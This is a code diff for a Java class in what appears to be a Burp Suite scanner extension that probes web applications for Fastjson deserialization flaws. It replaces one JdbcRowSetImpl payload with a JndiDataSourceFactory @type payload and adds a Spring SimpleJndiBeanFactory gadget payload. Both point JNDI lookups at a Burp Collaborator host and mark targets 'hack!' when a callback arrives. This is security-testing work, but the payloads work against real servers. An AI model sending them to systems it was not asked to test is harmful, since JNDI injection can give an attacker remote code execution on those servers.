@@ -180,12 +180,11 @@ public class FastJson {
         }
     }
 
-    public static void BasicDataSource_1() {
-        // TODO 待完成
+    public static void JndiDataSourceFactory() {
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         // 据说可以覆盖所有版本
-        String poc = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";
+        String poc = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":"+ val +"}}";
 
         // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
         // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
@@ -208,9 +207,42 @@ public class FastJson {
         }
         HttpResult httpResult = httpRequestThread.getResulemessageInfo();
         if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
-            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", "1.2.24 + JDK1.8.0_102", "hack!"));
         } else {
-            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", "1.2.24 + JDK1.8.0_102", "pass"));
+        }
+    }
+
+    public static void SimpleJndiBeanFactory() {
+        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
+        String val = collaboratorClientContext.generatePayload(true);
+        // 据说可以覆盖所有版本
+        String poc = "Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":["+val+"]},\"adviceBeanName\":"+ val +"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]";
+
+        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
+        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
+        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
+        try {
+            Thread thread = new Thread(httpRequestThread);
+            thread.start();
+            // // 等待，直到运行结束
+            thread.join();
+        } catch (Exception e) {
+            OutputStream out = BurpExtender.callbacks.getStderr();
+            PrintWriter p = new PrintWriter(out);
+            e.printStackTrace(p);
+            try {
+                p.flush();
+                out.flush();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
+        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
+        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", "1.2.24 + JDK1.8.0_102", "hack!"));
+        } else {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", "1.2.24 + JDK1.8.0_102", "pass"));
         }
     }
 }
